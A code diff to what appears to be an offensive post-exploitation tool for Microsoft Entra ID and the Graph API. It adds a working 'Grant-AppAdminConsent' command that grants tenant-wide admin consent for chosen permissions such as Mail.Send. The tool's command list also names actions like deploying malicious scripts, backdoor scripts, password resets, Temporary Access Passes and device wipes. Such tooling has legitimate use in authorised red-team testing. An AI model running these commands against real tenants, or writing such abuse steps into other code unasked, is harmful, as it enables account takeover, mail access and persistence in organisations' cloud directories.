@@ -123,11 +123,12 @@ def list_commands():
         ["Find-DynamicGroups", "Find groups with dynamic membership rules"],
         ["Update-UserPassword", "Update the passwordProfile of the target user (NewUserS3cret@Pass!)"],
         ["Update-UserProperties", "Update the user properties of the target user"],
+        ["Add-UserTAP", "Add new Temporary Access Password (TAP) to target user"],
+        ["Add-GroupMember", "Add member to target group"],
         ["Add-ApplicationPassword", "Add client secret to target application"],
         ["Add-ApplicationCertificate", "Add client certificate to target application"],
         ["Add-ApplicationPermission", "Add permission to target application e.g. Mail.Send and attempt to grant admin consent"],
-        ["Add-UserTAP", "Add new Temporary Access Password (TAP) to target user"],
-        ["Add-GroupMember", "Add member to target group"],
+        ["Grant-AppAdminConsent", "Grant admin consent for Graph API permission already assigned to enterprise application"],
         ["Create-Application", "Create new enterprise application with default settings"],
         ["Create-NewUser", "Create new Entra ID user"],
         ["Invite-GuestUser", "Invite guest user to Entra ID"],
@@ -654,7 +655,7 @@ def main():
     "get-roledefinitions", "get-roleassignments", "display-avpolicyrules", "display-asrpolicyrules", "display-diskencryptionpolicyrules", 
     "display-firewallrulepolicyrules", "display-lapsaccountprotectionpolicyrules", "display-usergroupaccountprotectionpolicyrules", 
     "display-edrpolicyrules","add-exclusiongrouptopolicy", "deploy-maliciousscript", "reboot-device", "shutdown-device", "lock-device", "backdoor-script",
-    "add-applicationpermission", "new-signedjwt", "add-applicationcertificate", "get-application", "locate-permissionid", "get-serviceprincipal"
+    "add-applicationpermission", "new-signedjwt", "add-applicationcertificate", "get-application", "locate-permissionid", "get-serviceprincipal", "grant-appadminconsent"
 ]
 
 
@@ -733,7 +734,7 @@ def main():
             "delete-user", "delete-group", "remove-groupmember", "delete-application", "delete-device", "wipe-device", "retire-device",
             "get-caps", "get-devicecategories", "display-devicecompliancepolicies", "get-devicecompliancesummary", 
             "get-deviceconfigurations", "get-deviceconfigurationpolicies", "get-deviceconfigurationpolicysettings", 
-            "get-deviceenrollmentconfigurations", "get-devicegrouppolicyconfigurations", 
+            "get-deviceenrollmentconfigurations", "get-devicegrouppolicyconfigurations", "grant-appadminconsent",
             "get-devicegrouppolicydefinition", "dump-devicemanagementscripts", "update-userproperties",
             "get-scriptcontent", "get-roledefinitions", "get-roleassignments", "display-avpolicyrules",
             "display-asrpolicyrules", "display-diskencryptionpolicyrules", "display-firewallrulepolicyrules", "backdoor-script",
@@ -3699,7 +3700,7 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
         print_yellow("\n[*] Add-ApplicationPermission")
         print("=" * 80)
         
-        # 1. CHECK existing permissions
+        # 1. check existing permissions
         api_url = f"https://graph.microsoft.com/beta/myorganization/applications(appId='{args.id}')"  # app id
         #api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}"  # object id
         
@@ -3714,7 +3715,7 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
             response_json = response.json()
             existingperms = response_json.get('requiredResourceAccess', [])
         
-        # 2. patch
+        # 2. patch perms
         api_url = f"https://graph.microsoft.com/beta/myorganization/applications(appId='{args.id}')"  # app id
         #api_url = f"https://graph.microsoft.com/v1.0/myorganization/applications/{args.id}"  # object id
 
@@ -3866,12 +3867,69 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
         print("=" * 80)
 
     # grant-appadminconsent
-    # - cover for if the grant fails in above likely due to token privs
-    # - instead of repeating whole request this can be used if permissions are updated successfully but the admin consent grant fails
-    # need:
-    # - admin_data payload and granturl/req
-    # - client app id 
-    # - permission name to be granted e.g. 'Mail.Send' - prompt for input?
+    elif args.command and args.command.lower() == "grant-appadminconsent":
+        if not args.id:
+            print_red("[-] Error: --id required for Grant-AppAdminConsent command")
+            return
+
+        print_yellow("\n[*] Grant-AppAdminConsent")
+        print("=" * 80)
+        clientAppId = args.id
+        user_agent = get_user_agent(args)
+        headers = {
+            'Authorization': f'Bearer {access_token}',
+            'User-Agent': user_agent,
+            'Content-Type': 'application/json',
+        }
+
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        file_path = os.path.join(script_dir, '.github', 'graphpermissions.txt')
+        try:
+            with open(file_path, 'r') as file:
+                content = file.read()
+        except FileNotFoundError:
+            print_red(f"\n[-] The file {file_path} does not exist.")
+            sys.exit(1)
+        except Exception as e:
+            print_red(f"\n[-] An error occurred: {e}")
+            sys.exit(1)
+
+        try:
+            permission_names = input("\nEnter Permission Names (comma-separated): ").strip().split(',')
+            permission_names = [name.strip() for name in permission_names]
+        except KeyboardInterrupt:
+            sys.exit()
+
+        invalid_permissions = [name for name in permission_names if name not in content]
+        if invalid_permissions:
+            print_red(f"\n[-] Invalid Graph permissions: {', '.join(invalid_permissions)}")
+            print("=" * 80)
+            sys.exit()
+
+        admin_data = {
+            "clientAppId": clientAppId,
+            "onBehalfOfAll": True,
+            "checkOnly": False,
+            "tags": [],
+            "constrainToRra": True,
+            "dynamicPermissions": [
+                {
+                    "appIdentifier": "00000003-0000-0000-c000-000000000000",
+                    "appRoles": permission_names, 
+                    "scopes": [] 
+                }
+            ]
+        }
+
+        url = "https://graph.microsoft.com/beta/directory/consentToApp"
+        request = requests.post(url, headers=headers, json=admin_data)
+                
+        if request.ok:
+            print_green(f"\n[+] Admin consent granted for: '{', '.join(permission_names)}'")
+        else:
+            print_red(f"\n[-] Failed to grant admin consent: {request.status_code}")
+            print_red(request.text)
+        print("=" * 80)
 
     # add-userTAP
     elif args.command and args.command.lower() == "add-usertap":
@@ -6050,8 +6108,10 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
         if not args.id:
             print_red("[-] Error: --id argument is required for Locate-PermissionID command")
             return
+
         print_yellow("\n[*] Locate-PermissionID")
         print("=" * 80)
+
         def parse_html(content):
             soup = BeautifulSoup(content, 'html.parser')
             permissions = {}
@@ -6075,10 +6135,12 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
                 permissions[title] = permission_data
         
             return permissions
+
         def highlight(text, should_highlight):
             if should_highlight:
                 return f"\033[92m{text}\033[0m"
             return text
+        
         def print_permission(permission, data, app_ids, delegated_ids):
             print_green(f"{permission}")
             for category, values in data.items():
@@ -6088,9 +6150,11 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
                 print(f"    Application: {highlight(values['Application'], app_highlight)}")
                 print(f"    Delegated: {highlight(values['Delegated'], delegated_highlight)}")
             print()
+
         identifiers = args.id.split(',')
         script_dir = os.path.dirname(os.path.abspath(__file__))
         file_path = os.path.join(script_dir, '.github', 'graphpermissions.txt')
+        
         try:
             with open(file_path, 'r') as file:
                 content = file.read()
@@ -6100,9 +6164,11 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
         except Exception as e:
             print_red(f"[-] An error occurred: {e}")
             return
+        
         permissions = parse_html(content)
         app_ids = []
         delegated_ids = []
+        
         for permission, data in permissions.items():
             if data['Identifier']['Application'] in identifiers:
                 app_ids.append(data['Identifier']['Application'])
@@ -6110,6 +6176,7 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
                 delegated_ids.append(data['Identifier']['Delegated'])
     
         found_permissions = False
+        
         for permission, data in permissions.items():
             if data['Identifier']['Application'] in app_ids or data['Identifier']['Delegated'] in delegated_ids:
                 print_permission(permission, data, app_ids, delegated_ids)
